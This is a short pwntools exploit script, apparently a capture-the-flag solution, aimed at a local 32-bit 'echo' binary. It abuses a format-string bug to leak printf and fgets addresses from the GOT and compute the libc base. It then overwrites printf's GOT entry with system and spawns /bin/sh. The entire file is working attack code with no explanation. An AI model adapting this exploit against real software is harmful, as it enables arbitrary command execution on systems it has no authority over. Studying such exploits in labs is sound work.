#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("./echo", checksec=False)
libc = ELF("./libc6_2.27-0ubuntu3_i386.so", checksec=False)

p = process("./echo_patched")
#p = remote()

#gdb.attach(p, gdbscript='''
#        b*0x0804874f
#        c
#        c
#''')

input()
payload = b""
payload += b"%21$s"
payload += b"%22$s"
payload = payload.ljust(40, b'A')
payload += p32(exe.got['printf'])
payload += p32(exe.got['fgets'])
p.sendlineafter(b"> ", payload)

leak_printf = u32(p.recv(4))
log.info("Leak printf: " + hex(leak_printf))
leak_fgets = u32(p.recv(4))
log.info("Leak fgets: " + hex(leak_fgets))
libc.address = leak_fgets - libc.sym['fgets']
log.info("Libc base: " + hex(libc.address))

goal = libc.sym['system']
g1 = goal & 0xffff
g2 = goal>>16 & 0xffff
log.warning("System: " + hex(goal))

payload = b""
payload += f"%{g1}c%21$hn".encode()
payload += f"%{g2-g1}c%22$hn".encode()
payload = payload.ljust(40, b'A')
payload += p32(exe.got['printf'])
payload += p32(exe.got['printf']+2)
p.sendlineafter(b"> ", payload)

p.sendline(b"/bin/sh\0")
p.interactive()
